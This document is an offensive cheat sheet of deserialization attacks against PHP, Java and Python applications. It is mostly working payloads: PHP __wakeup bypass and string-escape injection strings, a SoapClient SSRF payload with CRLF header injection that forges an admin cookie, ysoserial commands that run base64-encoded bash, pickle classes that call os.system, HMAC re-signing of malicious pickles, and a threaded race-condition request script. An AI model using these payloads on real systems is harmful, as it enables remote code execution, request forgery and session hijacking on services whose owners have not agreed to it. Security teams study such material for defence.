# Deserialization Exploit-Chain Handbook

## PHP Deserialization

### Basic Concepts
```php
// serialize
$s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}

// deserialize
$obj = unserialize($s);

// magic-method trigger chain
__construct() → __wakeup() → __destruct()
__toString() → __call() → __get()
```

### Common Exploit Chains

#### 1. __wakeup Bypass (CVE-2017-12944 / PHP < 7.4)
```php
// when the property count exceeds the actual count, __wakeup is not executed
O:4:"User":2:{...}   // normal
O:4:"User":3:{...}   // bypass __wakeup (property count 3 > actual 2)
```

#### 2. __toString Trigger
```php
class FileViewer {
    public $filename;
    function __toString() {
        return file_get_contents($this->filename);
    }
}
// build: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
```

#### 3. SoapClient CRLF Injection (SSRF)
```php
$target = "http://internal-service/";
$client = new SoapClient(null, array(
    'uri' => "http://attacker/",
    'location' => $target,
    'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
));
// after serialization, trigger SSRF + CRLF header injection
echo urlencode(serialize($client));
```

#### 4. PHP Serialization Length Manipulation
```
// exploit the string-length difference
// s:5:"admin" (5 bytes) vs s:5:"admin" (length may mismatch after modification)
// truncate or inject by changing the length value of the serialized string
```

### PHP Deserialization String Escape

**Growing escape** (longer after filtering):
```
// filter: "x" -> "xx" (1->2, +1 byte each)
// inject: put ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";} into a controllable property
// compute how many "x" are needed to make up the length difference
```

**Shrinking escape** (shorter after filtering):
```
// filter: "xx" -> "x" (2->1, -1 byte each)
// use the reduced length to swallow the following serialized string
```

## Java Deserialization

### Common Gadgets

| Gadget chain | Affected component | Command execution |
|-----------|---------|---------|
| CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
| CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
| Spring1 | Spring Framework | JdkDynamicProxy |
| Groovy1 | Groovy | MethodClosure |
| JBossInvoker | JBoss | InvokerTransformer |
| ROME | ROME | ObjectInstantiator |

### Detection Method
```
# Check common ports/paths
/invoker/readonly
/jmx-console/
/web-console/
/jbossws/
```

### Common ysoserial Payloads
```bash
java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
```

## Python Deserialization

### pickle Deserialization RCE
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# Send the payload to the target
```

### Signature Bypass
```python
# If the target uses HMAC signing
# 1. Obtain the signing key (possibly via information disclosure)
# 2. Build a malicious pickle and re-sign it
import hmac, hashlib
secret = b'secret_key'
payload = pickle.dumps(Evil())
signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
```

### __reduce__ Alternatives
```python
# Use __setstate__
class Evil:
    def __setstate__(self, state):
        os.system('id')
```

## Race-Condition Exploitation

```python
import requests
import threading

def exploit():
    # The time window between deserialization and validation
    r = requests.post(url, data=payload)
    
# Send concurrently
threads = [threading.Thread(target=exploit) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```
